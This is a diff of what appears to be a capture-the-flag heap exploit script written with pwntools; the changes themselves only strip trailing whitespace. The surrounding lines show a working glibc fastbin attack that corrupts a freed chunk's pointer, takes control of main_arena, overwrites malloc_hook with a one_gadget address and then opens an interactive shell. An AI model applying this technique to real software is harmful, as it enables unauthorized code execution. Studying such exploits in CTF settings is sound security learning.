@@ -17,9 +17,9 @@ else:
                # b *(0x555555554000 + 0x119b)
                # b *(0x555555554000 + 0xe88)
                # b *(0x555555554000 + 0xfa9)
-               # b *(0x555555554000 + 0xd54) 
-               # b *(0x555555554000 + 0x10C2) 
-               
+               # b *(0x555555554000 + 0xd54)
+               # b *(0x555555554000 + 0x10C2)
+
 def alloc(size):
     p.recvuntil("Command: ")
     p.sendline("1")
@@ -94,19 +94,19 @@ print "aligned_main_arena_chunk: ", hex(aligned_main_arena_chunk)
 # Allocate two chunks of fastbin size 0x50
 alloc(64) #This one is broken off fake smallbin chunk
 alloc(64)
-delete(6) # free something else 
+delete(6) # free something else
 delete(5) # free fastbin chunk that overlaps fastbin chunk 2
 
 # Corrupt fd ptr of fastbin chunk 5, using chunk2, to our fake chunk over main_arena
 update(2, 8, p64(aligned_main_arena_chunk))
 
-alloc(64) 
+alloc(64)
 alloc(64) # This alloc returns chunk over main_arena. idx 6
 
 # Modify top field of main_arena to point to malloc_hook
 update(6, 43, "B"*35 + p64(malloc_hook-16))
 
-# Now, allocate something over malloc_hook 
+# Now, allocate something over malloc_hook
 # Has to be a new size, so it's served from top chunk and not a bin
 alloc(40) # idx 7
 
@@ -117,10 +117,3 @@ update(7, 8, p64(one_gadget))
 alloc(22)
 
 p.interactive()
-
-
-
-
-
-
-
